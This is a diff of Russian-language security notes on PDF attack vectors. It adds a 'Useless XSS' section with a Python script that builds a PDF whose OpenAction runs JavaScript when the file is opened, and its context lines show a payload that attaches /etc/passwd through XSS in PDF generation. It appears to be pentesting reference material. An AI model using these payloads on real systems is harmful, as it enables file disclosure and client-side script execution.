@@ -67,6 +67,46 @@ src [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html]
 <annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
 ```
 
+### Useless XSS
+
+js код стартует в своем ограниченном контексте на стороне клиента. Что можно сделать:
+
+* выполнить js код в ограниченном контексте
+* сделать open redirect
+* сделать get-запрос со стороны клиента
+
+```python
+from pathlib import Path
+
+
+def generate_pdf_xss(path: str):
+    PAYLOAD = 'app.alert(app.url); app.alert(app);'
+    with Path(path).open(mode='w') as input_stream:
+        input_stream.write('''%PDF-1.4
+1 0 obj
+<<>>
+%endobj
+trailer
+<<
+/Root
+<</Pages <<>>
+/OpenAction
+    <<
+    /S/JavaScript
+    /JS(
+        ''' + PAYLOAD + '''
+    )
+    >>
+>>
+>>
+        ''')
+
+
+if __name__ == '__main__':
+    generate_pdf_xss('xss.pdf')
+
+```
+
 ## Tricks
 
 ## Анализ векторов, связанных с PDF-файлами
